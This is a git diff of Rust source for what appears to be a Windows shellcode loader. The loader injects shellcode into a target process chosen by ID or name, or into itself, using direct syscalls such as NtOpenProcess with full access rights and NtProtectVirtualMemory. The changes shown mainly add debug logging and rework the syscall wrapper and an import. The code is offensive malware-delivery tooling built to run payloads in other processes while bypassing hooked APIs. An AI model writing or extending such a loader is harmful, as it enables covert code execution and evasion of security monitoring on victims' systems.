@@ -3,6 +3,7 @@ use std::panic;
 
 #[allow(unused_imports)]
 use crate::debug_error;
+use crate::debug_info;
 #[allow(unused_imports)]
 use crate::debug_ok_msg;
 #[allow(unused_imports)]
@@ -19,6 +20,7 @@ use crate::debug_base;
 use crate::debug_info_msg;
 
 
+use crate::winapi::constants::PROCESS_ALL_ACCESS;
 use crate::winapi::{syscall_wrapper::SyscallWrapper, types::HANDLE};
 use crate::winapi::constants::STATUS_SUCCESS;
 
@@ -53,8 +55,10 @@ fn load(shell_code: Vec<u8>) -> bool {
 
 #[cfg(all(feature = "inject_proc_id", not(feature = "inject_self"), not(feature = "inject_proc_name")))]
 fn load(shell_code: Vec<u8>) -> bool {
+    let ntdll = SyscallWrapper::new();
     let process_id = String::from(env!("PROCESS_ID")).parse().unwrap();
-    inner_load_with_id(ntdll, process_id, shell_code)
+    debug_info!(process_id);
+    inner_load_with_id(&ntdll, process_id, shell_code)
 }
 
 
@@ -133,10 +137,9 @@ fn load(shell_code: Vec<u8>) -> bool {
     
     inner_load_with_id(&ntdll, process_id, shell_code)
 }
-
+ 
+#[allow(dead_code)]
 fn inner_load_with_id(ntdll: &SyscallWrapper, process_id: isize, shell_code: Vec<u8>)  -> bool {
-    use crate::winapi::constants::PROCESS_ALL_ACCESS;
-
     let mut process_handle: HANDLE = 0;
 
     crate::debug_ok_msg!(format!("Call to NtOpenProcess"));
@@ -182,6 +185,7 @@ fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDL
     }
     debug_success_msg!(format!("Memory allocated : {}b at {:#x}", size, address));
 
+    debug_info!(process_handle);
 
     let mut old_protect= 0u32;
     crate::debug_ok_msg!(format!("Call to NtProtectVirtualMemory"));
